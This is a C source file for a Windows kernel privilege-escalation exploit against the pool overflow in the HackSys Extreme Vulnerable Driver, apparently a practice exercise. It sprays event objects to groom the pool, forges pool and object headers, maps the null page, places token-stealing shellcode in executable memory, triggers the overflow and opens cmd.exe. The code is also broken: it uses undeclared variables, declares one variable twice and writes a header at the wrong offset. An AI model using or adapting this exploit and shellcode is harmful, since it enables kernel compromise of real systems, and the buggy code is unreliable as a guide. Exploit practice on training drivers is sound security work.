/*

NTSTATUS TriggerPoolOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {
    PVOID KernelBuffer = NULL;
    NTSTATUS Status = STATUS_SUCCESS;
 
    PAGED_CODE();
 
    __try {
        DbgPrint("[+] Allocating Pool chunk\n");
 
        // Allocate Pool chunk
        KernelBuffer = ExAllocatePoolWithTag(NonPagedPool,
                                             (SIZE_T)POOL_BUFFER_SIZE,
                                             (ULONG)POOL_TAG);
 
        if (!KernelBuffer) {
            // Unable to allocate Pool chunk
            DbgPrint("[-] Unable to allocate Pool chunk\n");
 
            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%X\n", (SIZE_T)POOL_BUFFER_SIZE);
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
        }
 
        // Verify if the buffer resides in user mode
        ProbeForRead(UserBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR));
 
        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", (SIZE_T)POOL_BUFFER_SIZE);
 
#ifdef SECURE
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy().
        // Hence, there will be no overflow
        RtlCopyMemory(KernelBuffer, UserBuffer, (SIZE_T)BUFFER_SIZE);
#else
        DbgPrint("[+] Triggering Pool Overflow\n");
 
        // Vulnerability Note: This is a vanilla Pool Based Overflow vulnerability
        // because the developer is passing the user supplied value directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of the allocated Pool chunk
        RtlCopyMemory(KernelBuffer, UserBuffer, Size);
#endif
 
        if (KernelBuffer) {
            DbgPrint("[+] Freeing Pool chunk\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
 
            // Free the allocated Pool chunk
            ExFreePoolWithTag(KernelBuffer, (ULONG)POOL_TAG);
            KernelBuffer = NULL;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}

'''
The driver allocates a pool chunk of size X and copies user supplied data into it,
however, it does not check if the user supplied data is larger than the memory it has allocated.
As a result, any extra data will overflow into the adjacent chunk on the non-paged pool.
'''

<-----------------
To Put it simply The driver lets us write arbitrary data to a paged pool, a kernel memory region,
with a little memory manipulation we are able to free and allocate object from the paged pool triggering once again
code execution.
---------------->

*/


#include "windows.h"

typedef NTSTATUS(__stdcall* pfNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T AllocationSize,
	ULONG AllocationType,
	ULONG Protect
);

int main()
{
	byte PoolHeader[0x9] = "\x40\x00\x08\x04\x45\x76\x65\xEE";
	byte objectHeaderQuotaInfo[0x11] = "\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	byte objectHeader[0x11] = "\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00";

	int a = 0;
	HANDLE res = NULL;
	HANDLE reta[10000] = { 0 };
	for (int h = 0; h < 10000; h++) {
		res = CreateEventA(NULL, 0, 0, "");
		if (res != NULL) {
			a += 1;
			reta[h] = result;
		}
	}

	a = 0;
	HANDLE hArr[5000] = { 0 };
	for (int k = 0; k < 5000; k++) {
		res = CreateEventA(NULL, 0, 0, "");
		if (result != NULL) {
			hArr[i] = res;
			a += 1;
		}
	}

	int f = 0;
	for (int a = 0; a < 5000; a += 16) {
		for (int zzz = 0; zzz <= 7; zzz++) {
			if (CloseHandle(handleArray[a + zzz]) != NULL) {
				f += 1;
				hArr[a + zzz] = NULL;
			}
		}
	}

	HANDLE dev = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return 1;
	}

	DWORD bRet = 0;
	byte Buff[0x220] = { 0 };
	memset(Buff, '\x41', 0x1F8);
	memcpy(Buff + 0x1F8, PoolHeader, 0x8); 
	memcpy(Buff + 0x1F8 + 8, objectHeaderQuotaInfo, 0x10); 
	memcpy(Buff + 0x1F8 + 10, objectHeader, 0x10); 

	char sc[67] = "\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x50" 
		"\x89\xC1\x8B\x98\xF8\x00\x00\x00" 
		"\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00" 
		"\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED" 
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00" 
		"\x61\xC2\x04\x00" 
		;
	LPVOID lpv = VirtualAlloc(
		NULL,
		sizeof(sc),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(lpv, sc, sizeof(sc));
	LPVOID addr = &lpv;

	int b = 1;
	int a = 0x78;
	pfNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfNtAllocateVirtualMemory)GetProcAddress(
		GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	HANDLE allocNullResult = (HANDLE)NtAllocateVirtualMemory(
		GetCurrentProcess(),
		(PVOID *)&b,
		NULL,
		(PSIZE_T)&a,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memset((LPVOID)0x0, 0, 0x78);
	memcpy((LPVOID)0x60, addr, 4);
	DeviceIoControl(
		dev,
		0x22200F,
		Buff,
		sizeof(Buff),
		NULL,
		0,
		&bRet,
		(LPOVERLAPPED)NULL
	);

	for (int t = 0; t < 5000; t++) {
		CloseHandle(hArr[t]);
	}

	system("cmd.exe");
	system("pause");
	CloseHandle(dev);
	return 0;
}


